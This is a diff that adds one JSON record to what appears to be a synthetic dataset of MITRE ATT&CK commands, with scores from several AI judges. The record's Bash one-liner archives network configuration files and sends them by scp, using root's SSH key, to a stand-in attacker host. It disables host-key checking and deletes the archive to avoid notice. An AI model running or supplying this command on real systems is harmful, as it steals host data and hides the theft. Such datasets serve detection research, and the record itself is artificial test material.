@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/netcfg_${ts}.tgz /etc/hosts /etc/resolv.conf /etc/network /etc/sysconfig/network-scripts >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/netcfg_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/net/ >/dev/null 2>&1 && rm -f /tmp/netcfg_${ts}.tgz",
+  "explanation": "Collects network configuration files and exfiltrates them via scp over SSH on port 443, using quiet mode and cleanup to avoid attention.",
+  "rationale_steps": [
+    "Package multiple network config paths into a single compressed archive.",
+    "Use scp with key-based auth for automated transfer without user interaction.",
+    "Disable host key checking to prevent any interactive verification prompts.",
+    "Delete local archive after transfer to limit forensic artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-f64dfaa1",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner is well-formed with correct Bash variable expansion, valid tar/scp flags, proper command chaining, and correctly ordered redirections.",
+        "semantic_score": 4,
+        "semantic_justification": "It packages target config files and exfiltrates via scp over SSH with quiet mode and cleanup consistent with automated exfiltration, but relies on a root-owned key (/root/.ssh/id_rsa) and the existence of all specified paths, reducing operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T01:57:25.932341Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, proper use of && chaining, valid flag formats for both tar and scp, and correct variable interpolation throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1020 automated exfiltration: it timestamps and archives network configuration files, transfers them via scp over port 443 (to blend with HTTPS traffic) using a private key with host-key checking disabled for stealth, and cleans up the local artifact afterward — all operationally realistic and consistent with the described technique.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:18:34.758425Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly formed Bash one-liner using valid variable substitution, command chaining with logical operators, and correct flag usage for tar and scp.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements the collection, packaging, and exfiltration workflow of T1020, though it would fail under the stated 'Privilege: None' constraint due to accessing /root/.ssh/id_rsa.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:18:39.102459Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
